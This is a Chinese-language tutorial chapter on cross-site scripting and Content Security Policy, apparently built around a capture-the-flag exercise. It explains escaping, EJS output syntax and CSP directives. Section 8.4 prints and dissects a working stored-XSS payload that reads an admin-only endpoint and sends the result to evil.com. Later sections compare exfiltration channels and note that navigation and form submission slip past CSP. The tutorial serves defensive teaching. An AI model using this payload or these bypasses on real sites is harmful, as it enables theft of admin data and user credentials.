# 08 XSS 与 CSP

> **本章一句话**：XSS = 让攻击者的脚本在受害网站**自己的页面**里执行，从而"继承"该网站的身份；CSP 是浏览器给页面开的"资源与脚本白名单"，用来兜底拦截注入——**转义是决定性的第一道，CSP 是第二道**。

## 8.1 XSS 是什么

XSS（Cross-Site Scripting，跨站脚本攻击）：**把攻击者的代码注入到受害网站的页面里执行**。核心危害在于"继承身份"——

> 脚本整份运行在受害网站的页面上，于是它的每一次 `fetch` 都天然是同源请求（自动带凭证）、它对页面 DOM 的每一次访问都畅通无阻。

按注入方式分三种经典类型：

| 类型 | 注入路径 | 特点 |
|------|---------|------|
| **存储型**（Stored） | 恶意内容先存进服务器（数据库/文件），之后**其他用户访问时**才被输出执行 | 一次注入、长期生效；本例的攻击就属于这类：笔记先存库、渲染时才执行 |
| **反射型**（Reflected） | 恶意内容藏在请求参数里，服务器**当次**把它"反射"回页面 | 需要诱导受害者点特定链接 |
| **DOM 型** | 服务器完全不涉及；页面自己的 JS 把不安全的数据写进了危险的 DOM 位置 | 纯客户端 |

## 8.2 输出转义：决定性的第一道

**转义**（escape）：输出 HTML 时，把有特殊含义的字符换成"纯文本形态"，让它们**不再是标签**：

| 字符 | 转义后 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&#34;` / `&quot;` |

本例用的模板引擎 EJS 有两种输出语法，**一字之差、安全性质完全相反**：

| 写法 | 含义 | 效果 |
|------|------|------|
| `<%= note.html %>` | 转义输出 | 笔记里的 `<script>` 变成 `&lt;script&gt;`，显示为文本 |
| `<%- note.html %>` | **不转义输出**（原样插入） | 笔记里的标签成为页面真正的标签，脚本会执行 |

两个必须纠正的直觉：

- **套着 `<pre>` 也拦不住脚本**：`<pre>` 只影响显示格式（保留空格、等宽字体），HTML 解析器在它内部照样解析标签。让脚本失效的是**转义**，不是 `<pre>`。（可自测：写一个静态页面 `<pre><script>alert(1)</script></pre>` 用浏览器打开，脚本照跑。）
- **"我存的是纯文本"**：危险与否由**输出点**决定，而不是由输入形态决定。同一篇内容，转义的输出点无害，不转义的输出点就是存储型 XSS。

本例的两个输出点形成鲜明对照：

| 页面 | 模板写法 | CSP | 结果 |
|------|---------|-----|------|
| 预览页 | `<pre><%= note.html %></pre>`（转义） | 严格（见 8.6） | 只显示文本 |
| 审查渲染分支 | `<%- note.html %>`（不转义） | **无 CSP** | 标签被执行——整条攻击链的终点 |

> 安全审计口诀：**用户内容在哪里被输出，哪里就是危险点**；设计上应保证"每个输出点都有转义或严格的 CSP"，一个例外就足以破防。

## 8.3 存储型 XSS 的完整链路（本例）

```text
① 攻击者创建笔记：内容是一段 HTML/JS（存在服务器上）
② 机器人按流程访问：触发"审查渲染"分支
③ 服务器把笔记**不转义**地插进响应页面（review-document 模板，无 CSP）
④ 浏览器把响应渲染成网页：攻击者的标签被解析、脚本执行
⑤ 脚本此刻是"目标域的页面脚本"：同源 fetch 自动带 admin 凭证
⑥ 读走管理员接口数据 → 外传
```

第 ⑤ 步是全部要害：**攻击者本人从没有过管理员权限，但脚本"变成了页面本身"**——它不需要"获得"权限，它天生就在权限内部运行（回顾 02 章：服务器判权限的单位是请求，请求的凭证由浏览器自动附带）。

## 8.4 payload 解剖

本例的完整 payload（99 个字符，塞进 128 字符上限）：

```html
<img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//evil.com:9975/f?"+t)'>
```

逐段拆：

| 片段 | 作用 |
|------|------|
| `<img src=q>` | 请求相对路径 `q`（不存在）→ 加载必然失败 → 触发 `onerror` |
| `onerror='...'` | 属性里的 JavaScript，图片加载失败时执行（省字符：属性值不写引号也行） |
| `fetch("/api/flag")` | **同源**请求（脚本正跑在目标域上），自动携带 admin 凭证 |
| `.then(r=>r.text())` | 拿到响应、转成文本（箭头函数省字符） |
| `.then(t=>location="//evil.com:9975/f?"+t)` | 让整个页面跳转到攻击者服务器，数据拼在 URL 参数里 → 外传完成 |

为什么用 `<img onerror>`：标签自闭合、加载失败的瞬间**自动触发**（无需任何用户交互）、执行时机确定，是 XSS 最常用的载体之一。执行证据（服务端日志视角）：页面上会真实产生一次 `GET /reports/q`（返回 404）——**这是"笔记被当作标签解析"的物理证据**。

## 8.5 外传方式对比：fetch / img / location

把数据送出目标域，有三种常见载体。选择依据是"哪个机制会被什么拦住"：

| 方式 | 请求能发出吗 | 会受 CSP 影响吗 | 备注 |
|------|------------|----------------|------|
| `fetch("https://evil.com/...")` | 能（CORS 只拦"读响应"） | **受 `connect-src` 管**，会被拦 | 不需要读响应，作为外传可用 |
| `<img src="https://evil.com/...">` | 能 | 受 `img-src` 管 | 只能带少量数据（URL 长度限制） |
| `location = "https://evil.com/..."` | 能（顶层导航） | **不受"获取类"指令管辖** | 数据放 URL 参数；会离开当前页 |

本例选 `location` 的三条理由：页面**没有 CSP** 时三者都可选，但导航是最"扛"的（即使将来页面加了 CSP 也基本不受影响）、不涉及 CORS（无需读响应）、字节开销最小。

> CORS 再强调一次：它拦的是"**读响应**"，不是"发请求"。所以"把数据外传出去"这种**单向发送**，CORS 基本不构成障碍；真正会在意的是 CSP 与请求类型（简单请求 vs 预检，见 4.3）。

## 8.6 CSP：内容安全策略

CSP（Content Security Policy，内容安全策略）是服务器写在**响应头**里的一串指令，告诉浏览器："这个页面只允许加载/执行哪些东西。"

```text
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

**查询规则（必须记住）**：浏览器按"资源类别"查对应指令；没有写该类别的指令就**回落到 `default-src`**。上面这行的效果：所有类别默认全禁，只放行同源样式表；不许被嵌入；不许改 `<base>`。

常用指令速查：

| 指令 | 管什么 | 例子 |
|------|--------|------|
| `default-src` | 兜底：其他指令没写时用它 | `default-src 'none'`（全禁） |
| `script-src` | 脚本（外链与内联） | `script-src 'nonce-<值>'` |
| `style-src` | 样式 | `style-src 'self'` |
| `img-src` | 图片 | `img-src 'none'` |
| `connect-src` | `fetch` / XHR / WebSocket 的连接 | `connect-src 'self'` |
| `frame-ancestors` | 谁可以把本页嵌进 iframe | `frame-ancestors 'none'` |
| `base-uri` | 页面 `<base>` 标签能指向哪 | `base-uri 'none'` |
| `form-action` | 表单能提交到哪 | `form-action 'self'` |
| `sandbox` | 响应头版的沙箱（05 章） | `sandbox allow-scripts` |

CSP 的定位：**纵深防御**。它不修漏洞本身（不转义仍然是不转义），而是在浏览器端兜底"就算标签进了页面，也不让它执行"。

## 8.7 内联脚本的放行：nonce、哈希、unsafe-inline

CSP 的白名单默认只认"外部来源"（如 `script-src 'self'` 放行同源脚本文件）。页面里**内联**的 `<script>代码</script>` 默认**全部禁止**。要放行需要下面几种做法：

| 做法 | 写法 | 特点 |
|------|------|------|
| **nonce** | CSP 写 `script-src 'nonce-<随机值>'`，标签写 `<script nonce="<随机值>">` | 服务器每次响应生成新随机值；攻击者猜不到本次的值，写不出合法标签 |
| **内容哈希** | CSP 写 `script-src 'sha256-<base64>'` | 对脚本内容做哈希；改一个字符即失效，需要重新生成并更新 CSP |
| `'unsafe-inline'` | `script-src 'unsafe-inline'` | **全部放行**——这一层对 XSS 的防护基本归零（名字里的 unsafe 就是这个意思） |

哈希的生成（标签之间的文本逐字符原样）：

```bash
echo -n '<脚本内容>' | openssl dgst -sha256 -binary | base64
# 或者让浏览器在无授权状态下拦一次：控制台报错里直接列出该脚本的哈希，复制即用
```

两个高频易错点：

1. **nonce/哈希的授权范围只覆盖 `<script>` 元素**——内联事件处理器（`onclick=`）和 `javascript:` 网址**不在其列**，需要 `'unsafe-inline'`（或冷门的 `'unsafe-hashes'`，浏览器支持不一）。
2. **两者不可兼得**：`script-src` 里只要出现 nonce 或哈希，浏览器就**忽略 `'unsafe-inline'`**——规范用这条规则逼代码迁移到"nonce + `addEventListener`"的写法。

三类内联代码在不同 CSP 下的浏览器行为：

| HTML 里的写法 | `default-src 'none'`（无任何脚本授权） | `script-src 'unsafe-inline'` |
|------|------|------|
| `<script>console.log(1)</script>`（脚本块） | 拦截 | 执行 |
| `<button onclick="console.log(1)">`（内联事件处理器） | 拦截 | 执行 |
| `<a href="javascript:console.log(1)">`（`javascript:` 网址） | 拦截 | 执行 |

## 8.8 完整对照：同一段 payload 在两个页面的命运

回到 8.4 的 payload，逐部分看它在两个输出点的命运：

| payload 部分 | 属于什么 | 预览页（转义 + `default-src 'none'`） | 渲染页（无转义、无 CSP） |
|---|---|---|---|
| `<img src=q>` | 资源获取（`img-src` 兜底） | 被禁，图片不加载 | 正常发起请求（404，失败） |
| `onerror='...'` | 内联事件处理器（`script-src` 兜底） | 被禁，处理器不注册 | 注册，并在失败时执行 |
| `fetch("/api/flag")` | 运行时连接（`connect-src` 管） | 到不了这一步 | 同源放行 |
| `location="..."` | 顶层导航（不在"获取"指令管辖范围） | 到不了这一步 | 放行 |

"到不了这一步"的含义：预览页的链条在**第一环就断了**——转义让标签从一开始就不存在；即便标签存在，图片请求会被 `img-src` 拒绝、`onerror` 会被 `script-src` 兜底拒绝注册；再假设真执行了，`fetch` 会被 `connect-src` 兜底拦下。**每一层都独立拦住它**，这就是"转义 + CSP"纵深配置的价值。

## 8.9 CSP 管不着的事（完整的边界）

| 管不着 | 说明 |
|--------|------|
| **顶层导航** | "让页面跳到别的网址"不受获取类指令管辖（`navigate-to` 指令未被主流浏览器实现）——所以外传数据用导航最稳 |
| **表单提交** | 提交表单是"导航"不是"获取"，`connect-src` 管不到它——利用这一点可以用"表单提交"绕过 CSP 对 `fetch` 的禁令（用 `form-action` 才能管） |
| 已注入的其他漏洞 | CSP 只拦"执行/加载"，不修复"数据被读走"之类的其他路径 |

**结论**：CSP 是一道强防线，但它的"漏格"（导航、表单）决定了它只能算纵深防御；根治仍然是"不转义输出"这一类**源头修复**。

## 8.10 易混点

| 混淆 | 正解 |
|------|------|
| "有 CSP 就不会有 XSS" | CSP 是兜底；转义才是决定性的第一道 |
| "nonce 和 sandbox 都是 CSP 的东西，差不多" | nonce 是"脚本运行许可证"；sandbox 是"关押规则"（05 章） |
| "`<pre>` 能防注入" | 只防"显示格式"；防注入靠转义 |
| "内联脚本和内联事件处理器 auth 方式相同" | nonce/哈希只管 `<script>` 元素；事件处理器需要 `unsafe-inline` |
